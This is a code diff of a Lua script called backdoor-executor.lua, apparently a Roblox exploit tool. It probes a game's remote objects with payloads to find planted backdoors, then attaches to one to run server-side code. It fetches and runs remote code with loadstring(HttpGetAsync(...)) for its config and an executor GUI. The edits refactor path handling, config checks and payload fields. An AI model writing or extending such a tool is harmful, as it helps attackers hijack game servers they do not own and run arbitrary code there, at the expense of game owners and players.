@@ -44,7 +44,7 @@ local msgOutputs = {
 	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
 	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
 	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
-	["configCantLoad"] = "Local configuration cannot be loaded, overwriting.",
+	["configCantLoad"] = "Local configuration cannot be loaded, it might be corrupted.",
 	["attached"] = "\n Attached Remote: %s\n Type: %s",
 	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
 	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
@@ -99,12 +99,45 @@ local function sendNotification(text)
 	})
 end
 
+local function getFullNameOf(object)
+	if not object then return end
+	local currentInstance = object
+	local result = ""
+
+	while currentInstance ~= game do
+		local currentName = (if currentInstance then currentInstance.Name else nil)
+		if not currentName then break end
+
+		local concatenatedStr = (
+			if (not string.match(currentName, "^[%w_]+$")) then
+				`["{currentName}"]`
+			else
+				`.{currentName}`
+		)
+		result = concatenatedStr .. result
+		currentInstance = currentInstance.Parent
+	end
+	result = string.sub(result, 2)
+	return result
+end
+
 local function pathToInstance(strPath)
 	if not strPath then return end
-	local pathSplit = string.split(strPath, ".")
+	local subPaths do
+		subPaths = table.create(0)
+
+		for matchedStr in string.gmatch(strPath, "[^%.]+") do
+			local subPath1 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%1")
+			local subPath2 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%2")
+
+			table.insert(subPaths, subPath1)
+			if subPath1 == subPath2 then continue end
+			table.insert(subPaths, subPath2)
+		end
+	end
 	local result = game
 
-	for _, pathName in pathSplit do
+	for _, pathName in subPaths do
 		if not result then return end
 		result = result:WaitForChild(pathName, 1) -- yielding go brr
 	end
@@ -291,7 +324,7 @@ local function initializeRemoteInfo(params, overwriteRemoteInfo)
 end
 
 local function initRemoteRedirection()
-	if not (config.redirectRemote and not remoteRedirectionInitialized) then return end
+	if not (config.redirectRemote and not remoteRedirectionInitialized) then return false end
 	local redirectedRemotePath = insertService:GetAttribute("bexeremotepath")
 
 	if not redirectedRemotePath then
@@ -340,7 +373,7 @@ local function onAttached(remoteInfoParams)
 	getgenv().__BEXELUAATTACHED = true
 	initializeRemoteInfo(remoteInfoParams)
 	sendNotification("Attached!")
-	warn(string.format(msgOutputs.attached, remoteInfoParams.instance:GetFullName(), remoteInfoParams.instance.ClassName))
+	warn(string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName))
 	initRemoteRedirection()
 
 	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
@@ -362,14 +395,14 @@ local function scanBackdoors()
 	local connection;
 	connection = logService.AttributeChanged:Connect(function(attributeName)
 		if attributeName ~= nonce then return end connection:Disconnect()
-		local payloadValue = string.split(logService:GetAttribute(nonce), "|")
-		local remoteObj = remotesList[payloadValue[1]]
-		local payloadInfo = config.backdoorPayloads[payloadValue[2]]
+		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
+		local remoteObj = remotesList[remoteResult[1]]
+		local payloadInfo = config.backdoorPayloads[remoteResult[2]]
 
 		task.spawn(onAttached, {
 			["instance"] = remoteObj,
-			["args"] = payloadInfo.Payload,
-			["argSrcIndex"] = table.find(payloadInfo.Payload, "source")
+			["args"] = payloadInfo.Args,
+			["argSrcIndex"] = table.find(payloadInfo.Args, "source")
 		})
 	end)
 
@@ -378,9 +411,9 @@ local function scanBackdoors()
 
 		for payloadName, payloadInfo in config.backdoorPayloads do runService.Heartbeat:Wait()
 			local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
-			if (not remotePassed or not payloadInfo.Payload) then continue end
+			if (not remotePassed or not payloadInfo.Args) then continue end
 
-			local currentPayload = table.clone(payloadInfo.Payload)
+			local currentPayload = table.clone(payloadInfo.Args)
 			local argSrcIdx = table.find(currentPayload, "source")
 			if not argSrcIdx then continue end
 
@@ -401,7 +434,7 @@ local function scanBackdoors()
 	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
 		if remoteInfo.foundBackdoor then break end
 
-		print(string.format(msgOutputs.printRemote, remoteObj:GetFullName(), remoteObjId, remoteObj.ClassName))
+		print(string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
 		task.spawn(testRemote, remoteObj, remoteObjId)
 	end
 
@@ -423,7 +456,6 @@ do -- config initialization
 			warn(msgOutputs.configCantLoad)
 			rawConfigFile = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 
-			writefile("bexe-config.lua", rawConfigFile)
 			loadedConfig = loadstring(rawConfigFile)()
 		end
 	end
@@ -435,16 +467,16 @@ do -- config initialization
 	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
 	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)
 
-	if (loadedConfig.configVer < 6 and successCount < 5) then warn(msgOutputs.outdatedConfig) end
+	if (loadedConfig.configVer < 7 or successCount < 5) then warn(msgOutputs.outdatedConfig) end
 	config = loadedConfig
 end
 do -- backdoor finding
 	if not getgenv().__BEXELUAATTACHED then
-		local placeCacheData = (if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil)
+		local placeCacheData = config.cachedPlaces[game.PlaceId]
 
 		if placeCacheData then
 			local successCount = 0
-			local remoteObj = pathToInstance(placeCacheData.Path)
+			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Path) else placeCacheData.Path)
 			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))
 
 			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
